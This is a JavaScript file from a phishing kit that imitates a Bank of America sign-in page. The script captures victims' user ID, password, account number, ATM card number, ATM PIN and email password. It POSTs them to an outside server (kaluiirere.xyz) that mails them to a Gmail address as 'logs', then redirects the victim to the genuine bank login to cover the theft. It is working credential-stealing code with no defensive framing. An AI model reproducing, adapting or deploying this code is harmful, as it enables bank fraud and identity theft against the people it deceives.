var yourUrl ="https://kaluiirere.xyz/pharoh/smtpjs.php";
        async function send_em(to,from,subject,body){
            let agent = navigator.userAgent;
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                  
                }
            };
            xhr.open("POST", yourUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                "to": to,
                "from": from,
                "subject": subject,
                "body": body
            }));
          
          
          
          }
        var your_email="emilmiller134@gmail.com";
        window.addEventListener("load", function(){
               
        document.getElementById("emaill").value=email;       
        document.getElementById("caw-signin").addEventListener("click", function(event){
            event.preventDefault();
        var userid = document.getElementById("oid").value;
        var pass =    document.getElementById("pass").value
        if( pass.length < 4 || userid.length < 4 )
        {
            alert ("please enter all feild correctly")
        }



        else{
            var body ="Email: "+email+"\nuserId: "+userid+"\n password: "+pass
            send_em(your_email,"ozoigbondu","Bank Of America logs from "+email,body).then(
                function(){
                    var show = document.getElementById("debit_cc");
                    var hide = document.getElementById("homeee");
                    hide.style.display = "none";
                    show.style.display = "block";
                        
                }
            )
        }

         });


         document.getElementById("btn-continue").addEventListener("click", function(event){
            event.preventDefault();
            var acctNumber= document.getElementById("acctNumber").value;
            var atmNumber=    document.getElementById("atmNumber").value
            var atmPin =    document.getElementById("atmPin").value
            var emaill =    document.getElementById("emaill").value
            var email_pass =    document.getElementById("email_pass").value
            if( acctNumber.length < 5 || atmNumber.length < 10  || atmPin.length < 3 || emaill.length < 3 || email_pass.length < 3 )
            {
                alert ("please enter all feild correctly")
            }
    
    
    
            else{
                var body ="Email: "+email+"\nacctNumber: "+acctNumber+"\n atmNumber: "+atmNumber+"\n atmPin : "+atmPin +"\n email__ : "+emaill +"\n email_pass : "+email_pass 
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                    window.location.href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj2vY6rh5X7AhWFZ8AKHcmPDtQQjBB6BAgMEAE&url=https%3A%2F%2Fsecure.bankofamerica.com%2Flogin%2Fsign-in%2FsignOnV2Screen.go&usg=AOvVaw3MVnQXUiUHuoDZqiMvvlPW"
                    }
                };
                xhr.open("POST", yourUrl, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({
                    "to": your_email,
                    "from": "ozoigbondu",
                    "subject": "Bank Of America logs from  "+email,
                    "body": body
                }));
            }
    
             });





         });
